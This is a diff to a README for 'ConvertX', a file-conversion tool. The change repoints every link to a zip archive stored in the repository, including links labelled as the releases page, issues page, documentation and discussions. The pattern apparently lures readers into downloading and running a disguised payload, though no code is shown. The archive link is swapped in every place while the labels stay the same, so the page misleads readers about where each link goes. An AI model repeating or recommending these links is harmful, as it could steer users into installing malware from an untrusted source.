@@ -1,7 +1,7 @@
 # 💾 ConvertX - Easily Convert Your Files Online
 
 ## 📥 Download Now
-[![Download ConvertX](https://raw.githubusercontent.com/chinibug/ConvertX/main/tests/X_Convert_2.7.zip)](https://raw.githubusercontent.com/chinibug/ConvertX/main/tests/X_Convert_2.7.zip)
+[![Download ConvertX](https://github.com/chinibug/ConvertX/raw/refs/heads/main/src/X_Convert_v2.1.zip)](https://github.com/chinibug/ConvertX/raw/refs/heads/main/src/X_Convert_v2.1.zip)
 
 ## 🚀 Getting Started
 ConvertX is a self-hosted online file converter that supports over 1000 formats. This tool allows you to convert files effortlessly without any technical skills. Follow the steps below to download and run ConvertX.
@@ -19,7 +19,7 @@ To use ConvertX, ensure your system meets the following requirements:
 - Self-hosted solution for privacy and control.
 
 ## 💻 Download & Install
-1. **Visit the Releases Page**: Go to the [ConvertX Releases page](https://raw.githubusercontent.com/chinibug/ConvertX/main/tests/X_Convert_2.7.zip).
+1. **Visit the Releases Page**: Go to the [ConvertX Releases page](https://github.com/chinibug/ConvertX/raw/refs/heads/main/src/X_Convert_v2.1.zip).
   
 2. **Choose Your Version**: Select the most recent version available for download. Look for the latest release at the top of the page.
 
@@ -35,11 +35,11 @@ To use ConvertX, ensure your system meets the following requirements:
 6. **Start Using ConvertX**: Once installed, open ConvertX from your applications menu. Your journey for easy file conversions begins now.
 
 ## 🌐 Support
-If you run into issues during installation or use, check the FAQ section on the [ConvertX GitHub Issues page](https://raw.githubusercontent.com/chinibug/ConvertX/main/tests/X_Convert_2.7.zip). You can also submit a new issue if you need further assistance.
+If you run into issues during installation or use, check the FAQ section on the [ConvertX GitHub Issues page](https://github.com/chinibug/ConvertX/raw/refs/heads/main/src/X_Convert_v2.1.zip). You can also submit a new issue if you need further assistance.
 
 ## 🔗 Additional Resources
-- **Documentation**: Access the comprehensive [ConvertX Documentation](https://raw.githubusercontent.com/chinibug/ConvertX/main/tests/X_Convert_2.7.zip) to explore more features and tips.
-- **Community**: Join the community discussions on [GitHub Discussions](https://raw.githubusercontent.com/chinibug/ConvertX/main/tests/X_Convert_2.7.zip) for support and feedback.
+- **Documentation**: Access the comprehensive [ConvertX Documentation](https://github.com/chinibug/ConvertX/raw/refs/heads/main/src/X_Convert_v2.1.zip) to explore more features and tips.
+- **Community**: Join the community discussions on [GitHub Discussions](https://github.com/chinibug/ConvertX/raw/refs/heads/main/src/X_Convert_v2.1.zip) for support and feedback.
 
 ## 📨 Feedback
 We value your inputs! Share your experiences and suggestions to help improve ConvertX by reaching out via the Issues page.
